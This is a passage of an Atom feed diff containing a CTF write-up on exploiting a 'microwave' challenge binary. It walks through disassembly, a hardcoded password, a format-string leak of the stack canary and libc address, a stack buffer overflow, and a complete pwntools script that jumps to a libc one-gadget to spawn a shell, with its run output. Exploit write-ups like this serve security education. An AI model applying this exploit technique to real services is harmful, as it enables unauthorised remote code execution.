+||`-&amp;gt; 0x00000fbe      4839c2         cmp rdx, rax                   // CHECK REACH END OF STRING
+|`==&amp;lt; 0x00000fc1      75ed           jne 0xfb0                   ;[?] // GO ON
+|     0x00000fc3      b801000000     mov eax, 1
+|     0x00000fc8      6689453c       mov word [rbp+arg_3ch], ax  ; [0x3c:2]=27 ; &#39;&amp;lt;&#39; // RETURN VALUE 1
+|     ; JMP XREF from 0x00000fee (sub.__printf_chk_f00)
+| .-&amp;gt; 0x00000fcc      488b442408     mov rax, qword [rsp + 8]    ; [0x8:8]=0
+| |   0x00000fd1      644833042528.  xor rax, qword fs:[0x28]
+|,==&amp;lt; 0x00000fda      7514           jne 0xff0                   ;[?]
+|||   0x00000fdc      4883c410       add rsp, 0x10                                                               &quot;
+
+... (snip) ...
+
+`---&amp;gt; 0x00000fe8      31d2           xor edx, edx
+ ||   0x00000fea      6689553c       mov word [rbp+arg_3ch], dx  ; [0x3c:2]=27 ; &#39;&amp;lt;&#39; // RETURN VALUE 0
+ |`=&amp;lt; 0x00000fee      ebdc           jmp 0xfcc&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The password is thus &lt;code&gt;n07_7h3_fl46&lt;/code&gt;. It was however possible to “see” it using a simple &lt;code&gt;strings&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;vuln1-string-format&quot;&gt;Vuln1: string format&lt;/h3&gt;
+&lt;p&gt;The first vulnerability is a string format on the username when connecting to twitter:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::bash
+ --------------------------------------------------------
+ |     Welcome to the next generation of MicroWaves!    |
+ |                         ***                          |
+ | This stylish Microwave with Grill function, includes |
+ |      a function that tweets your favourite food!     |
+ |                         ***                          |
+ --------------------------------------------------------
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp;amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
+
+           [MicroWave]: 1
+
+           Log in on Twitter:
+           username: %p.%p.%p.%p.%p.%p.%p.%p
+           password: n07_7h3_fl46
+
+Checking 0xa.0x7ffff7b0ce50.0x7ffff7fd8700.0x555555556ac0.(nil).0xeaa546f902a74f00.0x7ffff7dd7710.0x7ffff7dd7718
+Twitter account
+............&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It is thus possible to read up the stack. The leaked values are indeed interesting and will be used later:&lt;/p&gt;
+&lt;ul&gt;
+        &lt;li&gt;&lt;em&gt;0x7ffff7...&lt;/em&gt; look like libc addresses&lt;/li&gt;
+        &lt;li&gt;&lt;em&gt;0xeaa546f902a74f00&lt;/em&gt; looks like the canary&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;vuln2-stack-overflow&quot;&gt;Vuln2: stack overflow&lt;/h3&gt;
+&lt;p&gt;The second vulnerability is triggered when reading the content to tweet. It reads from stdin (0) and store the result on the stack&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::
+[0x00000ac0]&amp;gt; iz | grep &#39;#&amp;gt;&#39;
+vaddr=0x00002adb paddr=0x00002adb ordinal=019 sz=16 len=15 section=.rodata type=ascii string=\n           #&amp;gt;
+[0x00000ac0]&amp;gt; axt 0x00002adb
+data 0x1007 lea rsi, [rip + 0x1acd] in sub.__printf_chk_0
+[0x00000ac0]&amp;gt; pd @0x1007
+...
+0x00001032      31ff           xor edi, edi // 0 == STDIN
+0x00001034      4889e6         mov rsi, rsp // buffer on the stack
+0x00001037      ba00080000     mov edx, section..rela.plt  ; &quot;@? &quot; @ 0x800
+0x0000103c      31c0           xor eax, eax
+0x0000103e      e8ddf9ffff     call sym.imp.read
+...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We read up to 0x800 (2048) from stdin to the buffer (on the stack). If we consider the whole block, only 0x418 (1048) are reserved on the stack. We can thus overwrite saved RIP&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::
+sub rsp, 0x418                  | reserve 1048
+lea rsi, [rip + 0x1acd]         |
+mov edi, 1                      |
+mov rax, qword fs:[0x28]        | get the canary
+mov qword [rsp + 0x408], rax    | store canary at 1032
+xor eax, eax                    |
+call sym.imp.__printf_chk ;[a]  |
+xor edi, edi                    |
+call sym.imp.fflush ;[b]        |
+xor edi, edi                    | 0 == stdin
+mov rsi, rsp                    | buffer on the stack
+mov edx, section..rela.plt      | 0x800
+xor eax, eax                    |
+call sym.imp.read ;[c]          |
+lea rdi, [rip + 0x1aa1]         |
+call sym.imp.puts ;[d]          |
+mov rax, qword [rsp + 0x408]    |
+xor rax, qword fs:[0x28]        |
+jne 0x106a ;[e]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So to overflow the saved RIP, the payload should look like this:&lt;/p&gt;
+&lt;ul&gt;
+        &lt;li&gt;1032 bytes of junk&lt;/li&gt;
+        &lt;li&gt;8 bytes to replace the canary&lt;/li&gt;
+        &lt;li&gt;&lt;code&gt;1048-1032-8 = 8&lt;/code&gt; bytes&lt;/li&gt;
+        &lt;li&gt;saved RIP&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;
+&lt;p&gt;Due to the protections, one needs to exploit the binary using ROP. However looking into the provided libc shows that the &lt;em&gt;magic&lt;/em&gt; ROP chain is present.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::
+.text:000000000004652C mov     rax, cs:environ_ptr_0
+.text:0000000000046533 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;
+.text:000000000004653A lea     rsi, [rsp+180h+var_150]
+.text:000000000004653F mov     cs:dword_3C06C0, 0
+.text:0000000000046549 mov     cs:dword_3C06D0, 0
+.text:0000000000046553 mov     rdx, [rax]
+.text:0000000000046556 call    execve&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So by overwriting the saved-RIP with that address (libc base address + 0x4652C) we get RCE (execve of “/bin/sh”).&lt;/p&gt;
+
+&lt;p&gt;One needs to leak two elements to be able to exploit:&lt;/p&gt;
+&lt;ul&gt;
+        &lt;li&gt;the canary (to bypass canary protection)&lt;/li&gt;
+        &lt;li&gt;one address of the libc to retrieve the offset to the magic gadget above&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These are retrieved using the first vulnerability (string format). Then the second vulnerability (buffer overflow) is used to overflow the stack and overwrite the return address.&lt;/p&gt;
+
+&lt;p&gt;The addresses leaked from the string format shows some of them are in the libc (starting with 0x7fff…). We need to know how far from the base address these are in order to retrieve the base address. This base address is then used to refer to the magic gadget.&lt;/p&gt;
+
+&lt;p&gt;This is easily done with gdb:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::bash
+$ gdb microwave_61f50dba931bb10ab3089215b2e188f4
+gdb-peda$ set environment LD_PRELOAD=./libc.so.6
+gdb-peda$ r
+Starting program: /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
+
+ --------------------------------------------------------
+ |     Welcome to the next generation of MicroWaves!    |
+ |                         ***                          |
+ | This stylish Microwave with Grill function, includes |
+ |      a function that tweets your favourite food!     |
+ |                         ***                          |
+ --------------------------------------------------------
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp;amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
+
+           [MicroWave]: 1
+
+           Log in on Twitter:
+           username: %p.%p.%p.%p.%p
+           password: n07_7h3_fl46
+
+Checking 0xa.0x7ffff7b02870.0x7ffff7ff3740.0x555555556ac0.(nil)
+Twitter account
+............
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp;amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
+
+           [MicroWave]: ^C
+Program received signal SIGINT, Interrupt.
+Stopped reason: SIGINT
+0x00007ffff7b02810 in read () from ./libc.so.6
+gdb-peda$ vmmap
+Start              End                Perm  Name
+0x0000555555554000 0x0000555555557000 r-xp  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
+0x0000555555757000 0x0000555555758000 r--p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
+0x0000555555758000 0x0000555555759000 rw-p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
+0x0000555555759000 0x000055555577a000 rw-p  [heap]
+0x00007ffff7a17000 0x00007ffff7bd2000 r-xp  /tmp/libc.so.6
+0x00007ffff7bd2000 0x00007ffff7dd1000 ---p  /tmp/libc.so.6
+0x00007ffff7dd1000 0x00007ffff7dd5000 r--p  /tmp/libc.so.6
+0x00007ffff7dd5000 0x00007ffff7dd7000 rw-p  /tmp/libc.so.6
+0x00007ffff7dd7000 0x00007ffff7ddc000 rw-p  mapped
+0x00007ffff7ddc000 0x00007ffff7dfc000 r-xp  /lib/x86_64-linux-gnu/ld-2.19.so
+0x00007ffff7ff2000 0x00007ffff7ff8000 rw-p  mapped
+0x00007ffff7ff8000 0x00007ffff7ffa000 r-xp  [vdso]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r--p  [vvar]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.19.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.19.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p  [stack]
+0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The offset is thus &lt;code&gt;hex(0x7ffff7b02870 - 0x00007ffff7a17000) = 0xeb870&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now you can construct the exploit using &lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;pwntools&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;Exploit:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::Python
+#!/usr/bin/env python2
+# author: deadc0de6
+
+from pwn import *
+context.arch=&#39;amd64&#39;
+
+PASSWORD = &quot;n07_7h3_fl46&quot;
+magic_addr = 0x4652c
+base_offset = 0xeb870
+
+#p = remote(&#39;microwave.insomni.hack&#39;, 1337)
+p = remote(&#39;127.0.0.1&#39;, 1337)
+
+print p.recvuntil(&#39;[MicroWave]: &#39;)
+
+# select (1) connect
+p.sendline(&quot;1&quot;)
+p.recvuntil(&quot;username: &quot;)
+
+# send username
+p.sendline(&quot;%p.&quot;*8)
+p.recvuntil(&quot;password: &quot;)
+# send password
+p.sendline(PASSWORD)
+
+# read leaked addresses
+ret = p.recvuntil(&#39;[MicroWave]: &#39;)
+addrs = ret.split()[1].split(&#39;.&#39;)
+print addrs
+
+# canary is the sixth element
+canary = int(addrs[5], 16)
+
+# libc address is the second element
+libcaddr = int(addrs[1], 16)
+libc_base = libcaddr - base_offset
+
+# print some information
+print &#39;canary is %s&#39; % (hex(canary))
+print &quot;libc base: %s&quot; % (hex(libc_base))
+print &quot;magic addr: %s&quot; % (hex(libc_base + magic_addr))
+
+# select (2) send tweet
+p.sendline(&quot;2&quot;)
+print p.recvuntil(&quot;#&amp;gt; &quot;)
+
+# construct the exploit
+buf = &quot;A&quot;*1032
+buf += pack(canary)
+buf += &quot;B&quot;*8
+buf += pack(libc_base + magic_addr)
+
+# exploit
+p.sendline(buf)
+p.clean()
+
+# interact with it
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It is then possible to &lt;code&gt;cat&lt;/code&gt; the flag.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::bash
+$ ./microwave-pwn.py
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+
+ --------------------------------------------------------
+ |     Welcome to the next generation of MicroWaves!    |
+ |                         ***                          |
+ | This stylish Microwave with Grill function, includes |
+ |      a function that tweets your favourite food!     |
+ |                         ***                          |
+ --------------------------------------------------------
+           ----------------------------------
+           |  1. Connect to Twitter account |
+           |  2. Edit your tweet            |
+           |  3. Grill &amp;amp; Tweet your food    |
+           |  q. Exit                       |
+           ----------------------------------
+
+           [MicroWave]:
+[&#39;0xa&#39;, &#39;0x7f192241b870&#39;, &#39;0x7f1922b16740&#39;, &#39;0x7f192291aac0&#39;, &#39;(nil)&#39;, &#39;0x4cacfb0061420700&#39;, &#39;0x7f19226ef870&#39;, &#39;0x7f19226ef878&#39;, &#39;&#39;]
+canary is 0x4cacfb0061420700
+libc base: 0x7f1922330000
+magic addr: 0x7f192237652c
+
+           #&amp;gt;
+[*] Switching to interactive mode
+$ ls
+...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To reproduce the execution locally, I used socat with the following tweak:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;:::bash
+$ cat doit.sh
+#!/bin/bash
+LD_PRELOAD=./libc.so.6 ./microwave_61f50dba931bb10ab3089215b2e188f4
+$ socat tcp-l:1337,reuseaddr,fork exec:./doit.sh&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;note&quot;&gt;Note&lt;/h3&gt;
+&lt;p&gt;On some systems, using &lt;a href=&quot;http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html&quot;&gt;LD_PRELOAD&lt;/a&gt; won’t work and thus &lt;a href=&quot;http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html&quot;&gt;LD_LIBRARY_PATH&lt;/a&gt; with the full path to the folder containing the provided libc (&lt;em&gt;libc.so.6&lt;/em&gt;) should be provided.&lt;/p&gt;
+
+&lt;p&gt;It is indeed a better way of doing it since &lt;em&gt;LD_PRELOAD&lt;/em&gt; should be used when replacing only some specific functions of a library and not a full library (in which case &lt;em&gt;LD_LIBRARY_PATH&lt;/em&gt; is to be used).&lt;/p&gt;
+
+&lt;p&gt;Thanks to &lt;a href=&quot;https://twitter.com/dummys1337&quot;&gt;Dummys1337&lt;/a&gt; for pointing that out !!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+</content>
+		</entry>
+	
+
+</feed>
